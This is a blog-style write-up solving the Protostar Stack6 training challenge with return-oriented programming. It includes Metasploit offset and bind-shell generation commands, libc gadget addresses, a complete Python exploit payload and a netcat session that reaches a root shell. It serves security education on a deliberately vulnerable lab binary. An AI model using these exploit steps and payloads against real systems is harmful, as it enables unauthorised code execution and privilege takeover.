Title: Protostar Stack6 - ROP Solution
Date: 2015-03-06 10:20
Category: Exploits
Illustration: background.png
Tags: Exploits, ROP
Email: nildram@nildram.io

I've recently been revisiting the [Protostar](https://exploit-exercises.com/protostar/) challenges from [Exploit Exercises](https://exploit-exercises.com/). Having prevously only completed the [Stack6](https://exploit-exercises.com/protostar/stack6/) challenge using the duplicate payload and [return-to-libc](http://goo.gl/Tg1MN9) methods suggested in the description, I thought I would run through a ROP solution and writeup the steps as I go.

I'll skip any introduction to what is ROP for now as there's plenty of [other reading material](https://goo.gl/trusVL) already available which covers this.

The source code for the challenge is as follows:

	:::c stack6.c 
	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	void getpath()
	{
	  char buffer[64];
	  unsigned int ret;

	  printf("input path please: "); fflush(stdout);

	  gets(buffer);

	  ret = __builtin_return_address(0);

	  if((ret & 0xbf000000) == 0xbf000000) {
	      printf("bzzzt (%p)\n", ret);
	      _exit(1);
	  }

	  printf("got path %s\n", buffer);
	}

	int main(int argc, char **argv)
	{
	  getpath();
	}

The basic idea is pretty straight forward; exploit the program to get arbitrary code execution. However, we can see that there are some restrictions on the return address that can be used.

As suggested in the description, there are multiple ways around this restriction, but we will just look at the ROP technique.

## Controlling EIP

Before we do anything else, let's start off by gaining control over EIP.

We'll use Metasploit's `pattern_create` and `pattern_offset` tools to help us figure this one out.

	:::bash
	root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 > inputroot@kali:~# gdb -q ./stack6
	Reading symbols from /root/stack6...done.
	gdb$ r < input
	input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

	Program received signal SIGSEGV, Segmentation fault.
	--------------------------------------------------------------------------[regs]
	  EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
	  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
	  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
	Cannot access memory at address 0x37634136
	0x37634136 in ?? ()
	gdb$ q
	root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
	[*] Exact match at offset 80

Great so now we know that we need a payload with 80 junk bytes before we overwrite the return address of the `getpath()` function.

## Plan

Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as `/tmp/pwn`:

	:::bash
	root@kali:~# msfpayload linux/x86/shell_bind_tcp X > linux-bind-shell-tcp
	Created by msfpayload (http://www.metasploit.com).
	Payload: linux/x86/shell_bind_tcp
	 Length: 78
	Options: {}

We will cause the target program to execute the bind shell with the following command:

	:::c
	execv("/tmp/pwn", {NULL}, {NULL})

Let's break this down into steps:

1. Get our arguments into memory. We just need to get the string `/tmp/pwn` into memory and follow it with a `NULL`.
2. Setup registers.
  * Get argument of first argument into `ebx`.
  * Move address of second argument into `ecx`.
  * Move address of third argument into `edx`.
3. Call `execv`.
  * Move system call number `0x0b` into `eax`.
  * Call `int 0x80` to envoke the call.

### Getting our arguments into memory

First we need to get the arguments to the `execve` call into memory. We just need the single array of `char*` passed into the second argument of `execve` as shown above with the last `char*` being NULL. The first argument will point to the first element in the array, whist the third argument will point to the last element in the array.

We could just pass this in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the data section to store these parameters:

	:::bash
	user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
	08049710 <__data_start>:

Now we need some ROP gadgets. There's a tool for those, or rather a number of tools for those.

I'm going to go ahead and use `rp` from [here](https://github.com/0vercl0k/rp) because I can use a precompiled binary to avoid any dependency issues and because I'm a C++ fan.

#### File path 

Let's start by getting our file path `/tmp/pwn` into program memory. Here are the steps broken down along with the gadgets we will need to find:

1. Load 4 bytes of our arguments into some register. We will need a `pop r1; ret` gadget here.
2. Move the contents of that register into memory. We will need a `pop r2; ret` to load the target memory address and then a `mov [r2] r1; ret` to do the move.
3. Repeat steps 1 and 2 for successive 4 byte chunks, updating the address `[r2]` each time. We can also add a `NULL` on the end to terminate the string and provide the `NULL` for arguments two and three of the call to `execve`.

Let's look for these gadgets. There's not alot to go on in the `stack6` binary itself, so we look in `libc` as this is also linked in. We'll start with the `mov`, so we an identify which register we need to pop into, then the two `pop` gadgets.

	:::bash
	user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep " mov dword \[ecx\]"
	...
	0x00074997: mov dword [ecx], edx ; ret  ;  (1 found)
	...
	user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep "pop edx ; ret"
	...
	0x00001a9e: pop edx ; ret  ;  (6 found)
	...
	user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep "pop ecx ; ret"
	...
	0x0013519d: pop ecx ; ret  ;  (1 found)
	...

We can get the absolute address of this by adding it to the base address of `libc` which we can get from `/proc/<pid>/maps` as shown below.  

	:::bash
	user@protostar:~$ gdb -q /opt/protostar/bin/stack6
	Reading symbols from /opt/protostar/bin/stack6...done.
	gdb$ b main
	Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
	gdb$ r
	Breakpoint 1, main (argc=0x1, argv=0xbffff874) at stack6/stack6.c:27
	27	stack6/stack6.c: No such file or directory.
		in stack6/stack6.c
	gdb$ info proc
	process 2080
	cmdline = '/opt/protostar/bin/stack6'
	cwd = '/home/user'
	exe = '/opt/protostar/bin/stack6'
	gdb$ shell
	$ cat /proc/2080/maps
	08048000-08049000 r-xp 00000000 00:10 3537       /opt/protostar/bin/stack6
	08049000-0804a000 rwxp 00000000 00:10 3537       /opt/protostar/bin/stack6
	b7e96000-b7e97000 rwxp 00000000 00:00 0
	b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
	b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
	b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
	b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
	b7fd9000-b7fdc000 rwxp 00000000 00:00 0
	b7fe0000-b7fe2000 rwxp 00000000 00:00 0
	b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
	b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
	b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
	b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
	bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]

We need to setup our stack as follows using the `libc` base of `0xb7e97000`. 

	<lower memory>
	...
	# Load the target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049710 <- Target memory address in .data
	# Load the first part of our string "/tmp" into edx
	    0xb7e98a9e <- Return address (pop edx; ret)
	    "/tmp" <- First part of our string /tmp
	# Perform to move from edx to the .data segment
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	# Load the next target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049714 <- Target memory address in .data + 4 bytes
	# Load the second part of our string "/pwn" into edx 
	    0xb7e98a9e <- Return address (pop edx; ret)
	    "/pwn" <- Second part of our string /pwn
	# Perform the move to .data
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	# Load the final target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049718 <- Target memory address in .data + 4 bytes
	# Load the NULL into edx 
	    0xb7e98a9e <- Return address (pop edx; ret)
	    0x00000000 <- NULL bytes
	# Perform the move to .data
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	...
	<higher memory>

### Setting up the registers

Next step it to place the arguments in the three registers `ebx`, `ecx` and `edx`, so we need to find a `pop` for each.

	:::bash
	user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep " pop ebx" --color
	...
	0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
	...

Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.

	<lower memory>
	...
	# Load registers
	    0xb7f6fa81 <- Return address (pop edx; pop ecx; pop ebx; ret)
	    0x08049718 <- Argument 3 destined for edx - address of NULL
	    0x08049718 <- Argument 2 destined for ecx - address of NULL
	    0x08049710 <- Argument 1 destined for ebx - address of "/tmp/pwn"
	...
	<higher memory>


### Calling `execve`

We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, `libc` contains a gadget that serves both purposes:

	:::bash
	user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep "0x0000000B" ; int 0x80"
	...
	0x00097193: mov eax, 0x0000000B ; int 0x80 ;  (1 found)
	...

Our finished stack layout should look like this:

	<lower memory>
	...
	# Load the target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049710 <- Target memory address in .data
	# Load the first part of our string "/tmp" into edx
	    0xb7e98a9e <- Return address (pop edx; ret)
	    "/tmp" <- First part of our string /tmp
	# Perform to move from edx to the .data segment
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	# Load the next target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049714 <- Target memory address in .data + 4 bytes
	# Load the second part of our string "/pwn" into edx 
	    0xb7e98a9e <- Return address (pop edx; ret)
	    "/pwn" <- Second part of our string /pwn
	# Perform the move to .data
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	# Load the final target address in .data
	    0xb7fcc19d <- Return address (pop ecx; ret)
	    0x08049718 <- Target memory address in .data + 4 bytes
	# Load the NULL into edx 
	    0xb7e98a9e <- Return address (pop edx; ret)
	    0x00000000 <- NULL bytes
	# Perform the move to .data
	    0xb7f0b997 <- Return address (mov dword [ecx], edx; ret)
	# Load registers
	    0xb7f6fa81 <- Return address (pop edx; pop ecx; pop ebx; ret)
	    0x08049718 <- Argument 3 destined for edx - address of NULL
	    0x08049718 <- Argument 2 destined for ecx - address of NULL
	    0x08049710 <- Argument 1 destined for ebx - address of "/tmp/pwn"
	# Call execve
	    0xb7f2e193 <- Return Address (second ROP gadget)
	...
	<higher memory>

This now gives us the following payload:

	:::bash
	user@protostar:~$ python -c 'print "A"*80 + "\x9d\xc1\xfc\xb7" + "\x10\x97\x04\x08" + "\x9e\x8a\xe9\xb7" + "/tmp" + "\x97\xb9\xf0\xb7" + "\x9d\xc1\xfc\xb7" + "\x14\x97\x04\x08" + "\x9e\x8a\xe9\xb7" + "/pwn" + "\x97\xb9\xf0\xb7" + "\x9d\xc1\xfc\xb7" + "\x18\x97\x04\x08" + "\x9e\x8a\xe9\xb7" + "\x00\x00\x00\x00" + "\x97\xb9\xf0\xb7" + "\x81\xfa\xf6\xb7" + "\x18\x97\x04\x08" + "\x18\x97\x04\x08" + "\x10\x97\x04\x08" + "\x93\xe1\xf2\xb7"' > input
	user@protostar:~$ cat input | /opt/protostar/bin/stack6
	input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������

And from another shell:

	:::bash
	$ nc 192.168.94.133 4444
	whoami
	root

